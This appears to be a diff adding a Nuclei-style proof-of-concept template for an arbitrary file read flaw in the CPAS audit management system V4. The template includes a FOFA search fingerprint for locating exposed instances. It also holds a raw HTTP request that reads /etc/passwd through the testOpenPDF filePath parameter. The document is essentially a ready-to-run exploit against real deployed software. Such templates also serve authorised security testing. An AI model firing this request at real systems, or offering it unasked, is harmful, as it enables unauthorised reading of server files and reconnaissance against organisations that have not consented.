@@ -1,0 +1,27 @@
+id: poc-tg7touba7fouipvl
+info:
+  name: 友数聚CPAS审计管理系统V4 testOpenPDF 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tg7touba7fouipvl'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tg7touba7fouipvl
+    fofa: body="/cpasm4/static/cap/font/iconfont.css"
+http:
+- raw:
+  - 'GET /cpasm4/iWebPdf/testOpenPDF?filePath=/etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/609.1.15 (KHTML, like Gecko) Version/20.4 Safari/609.1.15'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
